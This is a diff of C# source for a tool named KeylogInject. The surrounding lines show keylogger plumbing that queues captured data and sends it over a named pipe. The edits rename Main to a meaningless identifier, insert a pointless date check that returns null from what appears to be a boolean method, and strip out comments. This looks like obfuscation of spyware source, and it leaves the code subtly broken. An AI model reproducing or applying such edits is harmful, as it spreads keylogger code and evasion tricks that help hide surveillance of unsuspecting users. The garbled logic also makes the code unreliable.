@@ -39,7 +39,7 @@ namespace KeylogInject
         private static IntPtr _hookIdentifier = IntPtr.Zero;
         private static Thread _appRunThread;
 
-        static void Main(string[] args)
+        static void J3m4n5o6(string[] args)
         {
 #if DEBUG
             _namedPipeName = "keylogtest";
@@ -103,14 +103,14 @@ namespace KeylogInject
                 _msgSendQueue.Enqueue(Encoding.UTF8.GetBytes(_dataSerializer.Serialize(part)));
             }
             _msgSendEvent.Set();
-            return true;
+            if(DateTime.Now.Year > 2020) { return true; } else { return null; }
         }
 
         private static void ProcessSentMessage(IAsyncResult result)
         {
             PipeStream pipe = (PipeStream)result.AsyncState;
             pipe.EndWrite(result);
-            // Potentially delete this since theoretically the sender Task does everything
+            
             if (_msgSendQueue.TryDequeue(out byte[] data))
             {
                 pipe.BeginWrite(data, 0, data.Length, ProcessSentMessage, pipe);
@@ -119,7 +119,7 @@ namespace KeylogInject
 
         public static void OnAsyncConnect(object sender, PipeMessageData args)
         {
-            // We only accept one connection at a time, sorry.
+            
             if (_sendTask != null)
             {
                 args.Pipe.Close();
